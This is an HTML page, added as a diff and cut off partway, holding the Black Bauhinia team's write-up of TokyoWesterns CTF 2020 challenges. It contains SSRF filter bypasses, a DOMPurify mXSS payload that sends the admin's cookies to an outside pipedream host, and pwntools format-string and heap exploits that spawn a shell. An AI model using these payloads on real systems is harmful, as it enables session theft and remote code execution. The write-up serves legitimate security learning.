@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TokyoWesterns CTF 6th 2020 Writeup | Black Bauhinia</title>
+
+<meta name="keywords" content="ctf, tokyowesterns-ctf" />
+<meta name="description" content="urlcheck v1 (Web, 98 points) Solved by Ozetta.
+Objective: SSRF http://127.0.0.1/admin-status The input needs to fulfil the pattern &#39;\A(\d&#43;)\.(\d&#43;)\.(\d&#43;)\.(\d&#43;)\Z&#39; and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, int(&quot;0177&quot;) is still 177 instead of 127 in Python, so we can use http://0177.0.0.1/admin-status
+urlcheck v2 (Web, 128 points) Solved by Ozetta.
+Objective: SSRF http://localhost/admin-status Standard TOCTOU bug, just use DNS rebinding to get access: http://23bbd91c.">
+<meta name="author" content="cire meat pop, harrier, Ozetta, Mystiz">
+<link rel="canonical" href="https://b6a.black/posts/2020-09-23-twctf/" />
+<link href="/assets/css/stylesheet.min.9733bd0dca4a7fe1379bd36836878b5b67d7a574e270b0fd4860e518a432e117.css" integrity="sha256-lzO9DcpKf&#43;E3m9NoNoeLW2fXpXTicLD9SGDlGKQy4Rc=" rel="preload stylesheet"
+    as="style">
+
+<link rel="icon" href="https://b6a.black/favicon.ico">
+
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.68.3" />
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-M67YZZ2MP1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-M67YZZ2MP1');
+</script>
+
+
+
+<script src="https://kit.fontawesome.com/fbbadced05.js" crossorigin="anonymous"></script>
+
+
+
+<meta property="og:title" content="TokyoWesterns CTF 6th 2020 Writeup" />
+<meta property="og:description" content="urlcheck v1 (Web, 98 points) Solved by Ozetta.
+Objective: SSRF http://127.0.0.1/admin-status The input needs to fulfil the pattern &#39;\A(\d&#43;)\.(\d&#43;)\.(\d&#43;)\.(\d&#43;)\Z&#39; and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, int(&quot;0177&quot;) is still 177 instead of 127 in Python, so we can use http://0177.0.0.1/admin-status
+urlcheck v2 (Web, 128 points) Solved by Ozetta.
+Objective: SSRF http://localhost/admin-status Standard TOCTOU bug, just use DNS rebinding to get access: http://23bbd91c." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://b6a.black/posts/2020-09-23-twctf/" />
+<meta property="article:published_time" content="2020-10-09T00:53:29+08:00" />
+<meta property="article:modified_time" content="2020-10-09T00:53:29+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TokyoWesterns CTF 6th 2020 Writeup"/>
+<meta name="twitter:description" content="urlcheck v1 (Web, 98 points) Solved by Ozetta.
+Objective: SSRF http://127.0.0.1/admin-status The input needs to fulfil the pattern &#39;\A(\d&#43;)\.(\d&#43;)\.(\d&#43;)\.(\d&#43;)\Z&#39; and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, int(&quot;0177&quot;) is still 177 instead of 127 in Python, so we can use http://0177.0.0.1/admin-status
+urlcheck v2 (Web, 128 points) Solved by Ozetta.
+Objective: SSRF http://localhost/admin-status Standard TOCTOU bug, just use DNS rebinding to get access: http://23bbd91c."/>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TokyoWesterns CTF 6th 2020 Writeup",
+  "name": "TokyoWesterns CTF 6th 2020 Writeup",
+  "description": "urlcheck v1 (Web, 98 points) Solved by Ozetta.\nObjective: SSRF http://127.0.0.1/admin-status The input needs to fulfil the pattern \u0026#39;\\A(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)\\Z\u0026#39; and the first …",
+  "keywords": [
+    "ctf", "tokyowesterns-ctf"
+  ],
+  "articleBody": "urlcheck v1 (Web, 98 points) Solved by Ozetta.\nObjective: SSRF http://127.0.0.1/admin-status The input needs to fulfil the pattern '\\A(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)\\Z' and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, int(\"0177\") is still 177 instead of 127 in Python, so we can use http://0177.0.0.1/admin-status\nurlcheck v2 (Web, 128 points) Solved by Ozetta.\nObjective: SSRF http://localhost/admin-status Standard TOCTOU bug, just use DNS rebinding to get access: http://23bbd91c.7f000001.rbndr.us/admin-status\nAngular of the Universe, part one (Web, 139 points) Solved by Ozetta.\nObjective of flag 1 is to access /debug/answer route in Angular through the nginx proxy, but debug is filtered and /debug is blocked in nginx. In nginx, the condition checking is done after path normalization, but the request path is sent to the proxy directly. So /debug/answer/../.. will pass the filter in nginx. To let Angular avoid the latter paths, we can use double slashes, which is used to separate secondary routes. To bypass the checking in server.ts, use d%65bug instead of debug. Finally, we need some gibberish at the end of the path to avoid redirect, which gives this payload: GET /d%65bug/answer//../../a HTTP/1.1\nbfnote (Web, 320 points) Solved by harrier and Ozetta.\nDuring the CTF, cure53 has attempted to patch a mXSS. In particular, the test case in the commit contains a valid payload exploiting the older versions of DOMPurify: CLICKME.\nEventually we have constructed the following payload to steal cookies from the admin:\n nothing more to say 2020 (Pwn, 111 points) Solved by cire meat pop.\nThis is a typical challenge on the format string vulnerability. Since NX protection is disabled, it should be possible to overwrite the return address to shellcode that is located on stack. Hence, stack address can be leaked and the return address can be overwritten.\np = remote('pwn02.chal.ctf.westerns.tokyo', 18247) def fmtp(payload): p.sendline(payload) return p.recvuntil(' ')[:-3] p.recvuntil(\" \") payload = \"%28$p\" leak = int(fmtp(payload),16) stack = leak-0x118 ret = stack+0x108 payload = \"%7$s||||\"+p64(stack) payload = fmtstr.fmtstr_payload(6, {ret: stack+8}, write_size='byte') fmtp(payload) payload = 'q'*8 + asm(shellcraft.amd64.linux.sh()) p.sendline(payload) p.interactive() We have the flag: TWCTF{kotoshi_mo_hazimarimasita_TWCTF_de_gozaimasu}. Translating via google: This is TWCTF, which has begun. Where has kotoshi gone?\nOnline Nonogram (Pwn, 252 points) Solved by cire meat pop.\nThe vulnerability is that we can overwrite the vector pointer to maze chunks.\nFirst leak heap info, then forge a vector to read the unsortbin pointer. Finally, overwrite free hook with system function by tcache attack and trigger it with /bin/sh.\np = remote('pwn03.chal.ctf.westerns.tokyo', 22915) def calc(off): return int(((off+8-1)*8)**0.5)+1 def dele(index): p.sendlineafter('Your input: ', '3') p.sendlineafter('Index',str(index)) p.recvuntil('Success') def add(title, size, payload): p.sendlineafter('Your input: ', '2') p.sendlineafter('Title: ', title) p.sendlineafter('Size: ', str(size)) p.sendafter('Puzzle: ', payload) def leakp(index): p.sendlineafter('Your input: ', '1') p.sendlineafter('Index',str(index)) p.recvuntil('Row\\'s Numbers\\n') a = p.recvuntil('\\nColumn\\'s Numbers')[:-17] p.sendlineafter(':','q') p.recvuntil('invalid choice') return a # leak heap info offset = 0x400 add('test2', calc(offset), '\\0'*offset) leak = leakp(2).replace('\\n','')[2:][::-1][32:] heap = int(leak,2) log.info('leak: {}'.format(hex(heap))) target = heap+0x60 new_heap = heap+0x520 heap_base = heap-0x11f90 # add padding to prevent freed large chunk consolidate with top chunk  add('pad', 0x10, '\\n') dele(2) # forge vector and maze chunk forged_chunk1 = new_heap+0xb0 forged_chunk2 = new_heap+0xe0 forged = flat(new_heap+0x40,new_heap+0x90,0,0,0,0,0,0x41) forged+= flat(0, target, target, 6,6,6,6,1,0x81) forged+= flat(0x81, 5, forged_chunk1, forged_chunk2, 0x81,6,6,6,1,0) forged+= flat(0x81)+ p64(0x81)*40+p64(0x121)*20 forged = forged.ljust(0x400,'\\0') forged+= flat(new_heap, new_heap+0x10, new_heap+0x38) add('forged', 0x70, forged) # leak libc info p.sendlineafter('Your input: ', '4') p.recvuntil('0 : ') leak = u64(p.recv(6)+'\\0\\0') libc_base = leak-0x1ebfd0 log.info('libc_base: {}'.format(hex(libc_base))) p.sendlineafter('Index','-1') # free overlapped chunk to tcache  dele(1) add('a', 50, 'a') add('whatever', 30, 'v'*0x48+p64(0x81)+p64(libc_base+libc.symbols['__free_hook'])) add('whatever', 30, 'whatever') # write system to free hook add('q', 30, p64(libc_base+libc.symbols['system'])) # trigger free hook p.sendlineafter('Your input: ', '2') p.sendlineafter('Title: ', '/bin/sh\\x00'+'\\0'*0x100) p.interactive() Flag: TWCTF{watashi_puzzle_daisuki_mainiti_yatteru}. Translating via google: I'm pu → I love you. WTF?\nReversing iS Amazing (Reverse, 126 points) Solved by Mystiz.\nOpen the binary with IDA. We can see that the binary signs argv[1] (which should be the flag) with RSA, then compares the signature with a given value. With that said, we have a RSA private key.\nSince we have the private key and the target signature (which the message is signed instead of its digest), we can simply recover the message by computing $s^e\\ \\text{mod}\\ n$. Unpadding the message we have TWCTF{Rivest_Shamir_Adleman}.\nTamarin (Reverse, 224 points) Solved by harrier and Mystiz.\nWe are given an APK for the challenge. As how we work on every single Android reversing challenge, we use apktool to decode the file. Noticing that it is developed in Xamarin, we use the Github repository tjg1/mono_unbundle to unbundle dll.so to a C# DLL source file. We now have source codes to read!\nIn particular we have this function:\npublic static bool Func4(string flag) { ParallelOptions parallelOptions = new ParallelOptions { MaxDegreeOfParallelism = 4 }; byte[] bytes = Encoding.ASCII.GetBytes(flag); int length = flag.Length; if ((length \u0026 3) != 0) { Array.Resizebyte(ref bytes, length + (4 - (length \u0026 3))); } for (int i = length; i 0; } if (bytes.Length != Check.equations_arr.GetLength(0) * 4) { return false; } object lockObj = new object(); ConcurrentBagbool checkResults = new ConcurrentBagbool(); Listuint list = new Listuint(); for (int j = 0; j 0); j++) { Listuint list2 = new Listuint(); list2.Add(BitConverter.ToUInt32(bytes, j * 4)); for (int k = 0; k 1); k++) { list2.Add(Check.equations_arr[j, k]); } list.Add(list2); } Parallel.ForEachuint(list, parallelOptions, delegate(Listuint equation) { object lockObj = lockObj; lock (lockObj) { uint num = Check.Func3(); for (int l = 0; l 10000; l++) { num = Check.Func2(equation, num, equation.Count - 2); } checkResults.Add(num == equation[equation.Count - 1]); } }); return Enumerable.Allbool(checkResults.ToArray(), (bool x) = x); }  Additionally, we have a equations_arr which is a $22\\times32$ matrix. After a bit of reversing, this is how we interpreted the challenge (everything is taken modulo 232):\nFirst we define $m_i$ be the $i$-th block (of 4 bytes) extracted from the flag. Define also the function $f_i$ such that $f_i(x) := m_i + a_{i,1} x + a_{i,2} x^2 + ... + a_{i,31} x^{31}$. The objective is to find $m_i$ such that $a_{i,32} = f_i^{(10000)}(n)$ for all $i = 1, 2, ..., 22$.\nWhat's $n$? It is the output of Check.Func3() and it actually is a random number... Is it even solvable?\n  Turns out it is. We notice that $a_{ij}$ is an even number for $i=1, 2, ..., 22$ and $j=1, 2, ..., 31$. With a bit of deduction (a bit means few sheets of paper and a lot of time), we are able to derive a function $g_i$ such that $f_i^{(10000)}(n) = g_i(m_i)$ for all $n$, i.e., this would be a constant.\nAfter all, the last thing is to compute $m_i$. We have the full flag solving $g_i(m_i) = a_{i,32}$:\nTWCTF{Xm4r1n_15_4bl3_70_6en3r4t3_N471v3_C0d3_w17h_VS_3n73rpr153_bu7_17_c0n741n5_D07_N3t_B1n4ry} easy-hash (Crypto, 75 points) Solved by Mystiz.\nThe challenge defines a new hash algorithm, easy_hash. It is defined by the following function:\ndef easy_hash(x): m = 0 for i in range(len(x) - 3): m += struct.unpack(', x[i:i + 4])[0] m = m \u0026 0xffffffff return m The objective is to find a collision pair: for twctf: please give me the flag of 2020\nMathematically, if $M=m_1m_2m_3\\dots m_n$, then\n\\[\\text{easy\\_hash}(M):=\\sum_{i=1}^{n-3}\\left(\\text{0x100}^3m_{i+3}+\\text{0x100}^2m_{i+2}+\\text{0x100}m_{i+1}+m_i\\right).\\]\nEquivalently it would be\n\\[ \\begin{aligned} \\text{easy\\_hash}(M) := m_1\u0026 + \\text{0x101} m_2 + \\text{0x10101} m_3 + \\text{0x1010101}\\sum_{i=4}^{n-3}m_i \\\\ \\end{aligned} \\]\nHence, the characters in the middle have the weight 0x1010101 for hash computing. Knowing that \"f\" = \"F\" + \" \", we can simply replace flag into F lag.\n$ curl \"https://crypto01.chal.ctf.westerns.tokyo/\" -X POST --data \"twctf: please give me the F lag of 2020\" # Congrats! The flag is TWCTF{colorfully_decorated_dream} sqrt (Crypto, 216 points) Solved by Mystiz.\nIn this challenge, we are given a ciphertext and a prime $p$. The ciphertext $c$ is computed from the message $m$ by $c \\equiv m^{2^{64}}\\ (\\text{mod}\\ p)$ - and the objective is of course to recover the flag $m$.\nMy first attempt is to repeatedly use Tonelli-Shanks 64 times to compute modular square roots. However, it basically takes forever because the number of candidates could double when it go deeper by one level. This means that we will get two candidates for $c^{1/2}$, four candidates for $c^{1/4}$ and so on. The number grows exponentially and definitely would not be feasible.\nFortunately, we can compute $m^{2^{30}}$ from $m^{2^{64}}$ without any hassle. Knowing that $p - 1 = 2^{30}q$, we can compute $d$ for $2^{34}d \\equiv 1\\ (\\text{mod}\\ p-1)$. Then $c^d \\equiv m^{d\\cdot 2^{64}}\\equiv m^{2^{30}}\\ (\\text{mod}\\ p)$. Then we can use Tonelli-Shanks for 30 times for the flag... Nope. That is still too slow.\nInstead we compute a 230-th root of unity modulo $p$ (denote it as $r$). If we have an candidate $m_0$ such that $c \\equiv {m_0}^{2^{64}}$, then the $m$ we want is any of the $m_0, rm_0, r^2m_0, ..., r^{2^{64}-1}m_0$, under modulo $p$. We can easily iterate through. It took me around fifteen minutes to compute the flag - TWCTF{17s_v3ry_34sy_70_f1nd_th3_n_7h_r007}.\ntwin-d (Crypto, 172 points) Solved by harrier and Mystiz.\nThis is a RSA challenge. Given a common modulus $n$, a pair of public keys are given such that their private exponents differ by two. Simply put,\n\\[ \\begin{cases}\\begin{aligned} e_2 (d+2) \u0026\\equiv 1\\ \\left(\\text{mod}\\ \\phi(n)\\right) \\\\ e_1 d \u0026\\equiv 1\\ \\left(\\text{mod}\\ \\phi(n)\\right) \\end{aligned}\\end{cases}. \\]\nharrier has observed that $e_2d \\equiv 1 - 2e_2$. With this, we can deduce a congruence relation that does not depend on $d$:\n\\[0 \\equiv e_1(e_2d) - e_2(e_1d) \\equiv e_1(1-2e_2)-e_2 \\equiv e_1 - e_2 - 2e_1e_2\\ \\left(\\text{mod}\\ \\phi(n)\\right).\\]\nIn this case, $e_1 - e_2 - 2e_1e_2$ will be a multiple of $\\phi(n)$. We can compute an equivalent private key $d'$ by computing $ed' \\equiv 1 \\ \\left(\\text{mod}\\ \\phi(n)\\right)$. Hence it suffices to recover the flag from the ciphertext - TWCTF{even_if_it_is_f4+e}.\nThe Melancholy of Alice (Crypto, 242 points) Solved by Mystiz.\nIn this challenge, we are asked to exploit ElGamal cryptosystem. The code supplied is responsible for generating key and encrypting the flag.\nN = 1024 def generateKey(): p = getStrongPrime(N) q = (p - 1) // 2 x = getRandomRange(2, q) g = 2 h = pow(g, x, p) pk = (p, q, g, h) sk = x return (pk, sk) def encrypt(m, pk): (p, q, g, h) = pk r = getRandomRange(2, q) c1 = pow(g, r, p) c2 = m * pow(h, r, p) % p return (c1, c2) Since everything looked pretty legit, we were stuck. Since $p$ is strong, if we write $p := 2q + 1$ then $q$ would be a prime. Alas, the prime is of 1024 bits long. The challenge is very secure, isn't it?\nWithout any clues, we were messing around. Eventually we tried to factorize $p-1$.\n    Wait what? Isn't $p$ a strong prime? Why are there so many factors? Turns out we have messed up the definition of strong prime. A strong prime $p$ is basically a prime with $p-1$ having a large prime factor. The desired $p$ they want should be safe but not strong.\nOkay, back on business. I used $r = 5710354319$ that is a factor of $p-1$. Then the remaining would be easy with discrete logarithm.\n# p, q, g, h are redacted to save up some spaces with open('challenge/ciphertext.txt') as f: cs = list(map(eval, f.read().strip().split('\\n'))) r = 5710354319 assert (p-1) % r == 0 x = dlog.bsgs(pow(g, (p-1)//r, p), pow(h, (p-1)//r, p), p, r) assert pow(g, x * (p-1)//r, p) == pow(h, (p-1)//r, p) ms = b'' m_map = list(map(lambda m: pow(m, (p-1)//r, p), range(0x20, 0x80))) print(m_map) for c1, c2 in cs: c1 = pow(c1, (p-1)//r, p) c2 = pow(c2, (p-1)//r, p) m = c2 * powmod(c1, -x, p) % p assert m in m_map ms += bytes([m_map.index(m) + 0x20]) print(ms) XOR and shift encryptor (Crypto, 303 points) Solved by Mystiz.\nThis is more like a PPC challenge instead of a cryptography challenge. There is a randgen function, that serves as the core of the challenge, defined below:\ndef randgen(): global s,p a = 3 b = 13 c = 37 s0 = s[p] p = (p + 1) \u0026 63 s1 = s[p] res = (s0 + s1) \u0026 ((164)-1) s1 ^= (s1  a) \u0026 ((164)-1) s[p] = (s1 ^ s0 ^ (s1  b) ^ (s0  c)) \u0026 ((164)-1) return res They are utilizing the \"inefficiency\" of the above function to encrypt the flag. In particular, they are using the $k_i$-th output to encrypt the $i$-th character of the flag (while $k_i$ could be up to 2100). Of course the naive approach doesn't work - you will wait forever.\nHowever, if we are only considering the state transition (i.e., how s is updated), we can see that it only involves bit shifting and XOR. Let's define $s_0, s_1, ...$ be a sequence with $s_i^{(k)}$ be the $k$-th bit of $s_i$. Imagine that the initial state being $(s_0, s_1, ..., s_{63})$ and the subsequent states being $(s_{64}, s_1, ..., s_{63})$, $(s_{64}, s_{65}, ..., s_{63})$ and so on.\nWe can write transitions under the definition (note that the $+$ operation is actually operated under $\\text{GF}(2)$, i.e., it is a XOR):\n $s_{i+64}^{(0)} := s_i^{(0)} + s_i^{(10)} + s_i^{(13)} + s_{i+63}^{(0)} + s_{i+63}^{(37)}$, $s_{i+64}^{(1)} := s_i^{(1)} + s_i^{(11)} + s_i^{(14)} + s_{i+63}^{(1)} + s_{i+63}^{(38)}$, ...  Hence, we can define a $64^2\\times64^2$ transition matrix $T$ over $\\text{GF}(2)$ from the above definition. Then if we can compute $T^{m}$, we can easily obtain $s_m, s_{m+1}, ..., s_{m+63}$.\nHelp. I personally think it is infeasible to compute the exponentiations since the dimension is large (wouldn’t it be $O(m^{2.3737}\\cdot\\log n)$ to compute $M^n$ for a $m\\times m$ matrix?).  Since we can efficiently compute $s_m$ given an arbitrary $m$, it would be easy for us to skip unecessary states and compute the flag: FAKEFLAG{THIS_IS_FAKE_FLAG}.\nOops, nope. I mean\nTWCTF{1084cd93186a8ab4110c991a7980aae36d77f2_X0R5h1f7+_15_m0Re_c0mp1ex_th4n_y0u_thought_right?1!!} circular (Crypto, 370 points) Solved by Mystiz.\nThere are two endpoints provided, pubkey and verify. The pubkey endpoint returns a fix n and k.\n$ curl \"https://crypto02.chal.ctf.westerns.tokyo/\" -X POST --data '{\"cmd\":\"pubkey\"}' # {\"pubkey\":{\"n\":\"25299...\",\"k\":\"31019...\"}} And one can submit x, y and msg to the verify endpoint. It is verifying a signature in the following way:\n\\[x^2 + ky^2 \\equiv \\text{hash}(msg)\\ (\\text{mod}\\ n).\\]\nIn particular, you can get the flag when the signature is correct and msg == 'SUNSHINE RHYTHM'. Hence, the objective is to solve the quadratic congruence $x^2 + ky^2 \\equiv m\\ (\\text{mod}\\ n)$. This is a simplified version of OSS schemes.\nI was not aware of the OSS schemes beforehand. I spent some time deriving the solution by myself but in vain. Eventually, I've gave up deriving everything from nothing and came across to Pollard's algorithm (From An Efficient Solution of the Congruence x2 + ky2 = m (mod n) by Pollard and Schnorr). Moreover, the algorithm is described very clearly in An Exposition of Pollard's Algorithm for Quadratic Congruences by Shallit. I have an implementation of Pollard's algorithm following their procedures.\nSupplying $k$, $m$ and $n$ to Pollard's algorithm, we can get $x$ and $y$ rather quickly. Submitting the values to the verify endpoint would give us the flag - TWCTF{dbodfs-dbqsjdpso-mjcsb-mfp}.\nBirds (Misc, 41 points) Solved by cire meat pop and Mystiz.\nNothing much is given from the challenge description, there are a multiple lines /^[A-Z]{2}[0-9]{3,4}$/'s.\nBC552 AC849 JL106 PQ448 JL901 LH908 NH2177 After a bit of Googling, those are flight numbers. What do they mean? Let's see where they depart and arrive:\n   Flight Depart from Arrive to     BC552 OKA NGO   AC849 LHR YYZ   JL106 ITM HND   PQ448 TBS ODS   JL901 HND OKA   LH908 FRA LHR   NH2177 NRT ITM    Hmm... We can see some locations shown more than once. There must be some meaning. Let's connect them.\nNRT - ITM - HND - OKA - NGO FRA - LHR - YYZ TBS - ODS By taking the first letter from each of them, we get:\nNIHON FLY TO Oh and finally we have the flag: TWCTF{FLYTONIHON}. Unfortunately the finals is online this year... (And we are not qualified, too)\nAddendum: We did!\nmask (Misc, 26 points) Solved by harrier and cire meat pop.\nThere is a list of IP addresses and maybe subnet mask in the challenge description.\n192.168.55.86/255.255.255.0 192.168.80.198/255.255.255.128 192.168.1.228/255.255.255.128 192.168.90.68/255.255.254.0 192.168.8.214/255.255.255.128 ... The list is quite long, we suspect that each IP address is representing a character. After multiple unsuccessful attempts, we found the host identifier for the last row is 0b111101, which is = in ASCII... Is it encoded with base64?\nimport base64 with open('mask.txt') as f: s = f.read().split('\\n') a = '' for i in s: lr = i.split('/') l = lr[0].split('.') r = lr[1].split('.') a+=chr(int(l[3])\u0026(255^int(r[3]))) print(base64.b64decode(a)) The output is: TWCTF{Are-you-using-a-mask?}\n",
+  "wordCount" : "2732",
+  "inLanguage": "en",
+  "datePublished": "2020-10-09T00:53:29+08:00",
+  "dateModified": "2020-10-09T00:53:29+08:00",
+  "author":[{
+    "@type": "Person",
+    "name": "cire meat pop"
+  }, {
+    "@type": "Person",
+    "name": "harrier"
+  }, {
+    "@type": "Person",
+    "name": "Ozetta"
+  }, {
+    "@type": "Person",
+    "name": "Mystiz"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://b6a.black/posts/2020-09-23-twctf/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Black Bauhinia",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://b6a.black/favicon.ico"
+    }
+  }
+}
+</script>
+
+
+
+</head>
+
+<body class=" dark" id="top">
+<noscript>
+    <style type="text/css">
+        .theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://b6a.black/" accesskey="h" title="Black Bauhinia (Alt + H)">Black Bauhinia</a>
+            <span class="logo-switches">
+                
+                
+            </span>
+        </div>
+        <ul id="menu" onscroll="menu_on_scroll()">
+            <li>
+                <a href="https://b6a.black/about-us/" title="About Us">
+                    <span>About Us</span>
+                </a>
+            </li></ul>
+    </nav>
+</header>
+
+    <main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+
+    <h1 class="post-title">
+      TokyoWesterns CTF 6th 2020 Writeup
+    </h1>
+    <div class="post-meta">
+
+October 9, 2020&nbsp;·&nbsp;cire meat pop, harrier, Ozetta, Mystiz
+
+</div>
+  </header>
+  
+  
+  <div class="post-content">
+<h2 id="urlcheck-v1-web-98-points">urlcheck v1 (Web, 98 points)<a hidden class="anchor" aria-hidden="true" href="#urlcheck-v1-web-98-points">#</a></h2>
+
+<p>Solved by <em>Ozetta</em>.</p>
+
+<p>Objective: SSRF <code>http://127.0.0.1/admin-status</code>
+The input needs to fulfil the pattern <code>'\A(\d+)\.(\d+)\.(\d+)\.(\d+)\Z'</code> and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, <code>int(&quot;0177&quot;)</code> is still 177 instead of 127 in Python, so we can use <code>http://0177.0.0.1/admin-status</code></p>
+
+<h2 id="urlcheck-v2-web-128-points">urlcheck v2 (Web, 128 points)<a hidden class="anchor" aria-hidden="true" href="#urlcheck-v2-web-128-points">#</a></h2>
+
+<p>Solved by <em>Ozetta</em>.</p>
+
+<p>Objective: SSRF <code>http://localhost/admin-status</code>
+Standard TOCTOU bug, just use DNS rebinding to get access:
+<code>http://23bbd91c.7f000001.rbndr.us/admin-status</code></p>
+
+<h2 id="angular-of-the-universe-part-one-web-139-points">Angular of the Universe, part one (Web, 139 points)<a hidden class="anchor" aria-hidden="true" href="#angular-of-the-universe-part-one-web-139-points">#</a></h2>
+
+<p>Solved by <em>Ozetta</em>.</p>
+
+<p>Objective of flag 1 is to access <code>/debug/answer</code> route in Angular through the nginx proxy, but <code>debug</code> is filtered and <code>/debug</code> is blocked in nginx.
+In nginx, the condition checking is done after path normalization, but the request path is sent to the proxy directly. So <code>/debug/answer/../..</code> will pass the filter in nginx. To let Angular avoid the latter paths, we can use double slashes, which is used to separate secondary routes. To bypass the checking in <code>server.ts</code>, use <code>d%65bug</code> instead of <code>debug</code>. Finally, we need some gibberish at the end of the path to avoid redirect, which gives this payload:
+<code>GET /d%65bug/answer//../../a HTTP/1.1</code></p>
+
+<h2 id="bfnote-web-320-points">bfnote (Web, 320 points)<a hidden class="anchor" aria-hidden="true" href="#bfnote-web-320-points">#</a></h2>
+
+<p>Solved by <em>harrier</em> and <em>Ozetta</em>.</p>
+
+<p>During the CTF, cure53 has attempted to patch a mXSS. In particular, the test case in the commit contains a valid payload exploiting the older versions of DOMPurify: <a href="https://github.com/cure53/DOMPurify/commit/02724b8eb048dd219d6725b05c3000936f11d62d#diff-f44bc3a1bfaa31000b8f4f1359dba82aR1085"><code>&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;math&gt;CLICKME&lt;/math&gt;</code></a>.</p>
+
+<p>Eventually we have constructed the following payload to steal cookies from the admin:</p>
+<pre><code>&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;math&gt;&lt;img src=//7a58976474871f9e062175cbd8755cbc.m.pipedream.net/q onerror=location=this.src+document.cookie&gt;&lt;/math&gt;</code></pre>
+<h2 id="nothing-more-to-say-2020-pwn-111-points">nothing more to say 2020 (Pwn, 111 points)<a hidden class="anchor" aria-hidden="true" href="#nothing-more-to-say-2020-pwn-111-points">#</a></h2>
+
+<p>Solved by <em>cire meat pop</em>.</p>
+
+<p>This is a typical challenge on the format string vulnerability. Since NX protection is disabled, it should be possible to overwrite the return address to shellcode that is located on stack. Hence, stack address can be leaked and the return address can be overwritten.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;pwn02.chal.ctf.westerns.tokyo&#39;</span>, <span style="color:#ae81ff">18247</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fmtp</span>(payload):
+
+    p<span style="color:#f92672">.</span>sendline(payload)
+    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt; &#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>]
+
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%28$p&#34;</span>
+leak <span style="color:#f92672">=</span> int(fmtp(payload),<span style="color:#ae81ff">16</span>)
+stack <span style="color:#f92672">=</span> leak<span style="color:#f92672">-</span><span style="color:#ae81ff">0x118</span>
+ret <span style="color:#f92672">=</span> stack<span style="color:#f92672">+</span><span style="color:#ae81ff">0x108</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%7$s||||&#34;</span><span style="color:#f92672">+</span>p64(stack)
+payload <span style="color:#f92672">=</span> fmtstr<span style="color:#f92672">.</span>fmtstr_payload(<span style="color:#ae81ff">6</span>, {ret: stack<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>}, write_size<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;byte&#39;</span>)
+fmtp(payload)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;q&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> asm(shellcraft<span style="color:#f92672">.</span>amd64<span style="color:#f92672">.</span>linux<span style="color:#f92672">.</span>sh())
+p<span style="color:#f92672">.</span>sendline(payload)
+
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+<p>We have the flag: <code>TWCTF{kotoshi_mo_hazimarimasita_TWCTF_de_gozaimasu}</code>. Translating via google: <code>This is TWCTF, which has begun</code>. Where has kotoshi gone?</p>
+
+<h2 id="online-nonogram-pwn-252-points">Online Nonogram (Pwn, 252 points)<a hidden class="anchor" aria-hidden="true" href="#online-nonogram-pwn-252-points">#</a></h2>
+
+<p>Solved by <em>cire meat pop</em>.</p>
+
+<p>The vulnerability is that we can overwrite the vector pointer to maze chunks.</p>
+
+<p>First leak heap info, then forge a vector to read the unsortbin pointer. Finally, overwrite free hook with system function by tcache attack and trigger it with <code>/bin/sh</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;pwn03.chal.ctf.westerns.tokyo&#39;</span>, <span style="color:#ae81ff">22915</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calc</span>(off):
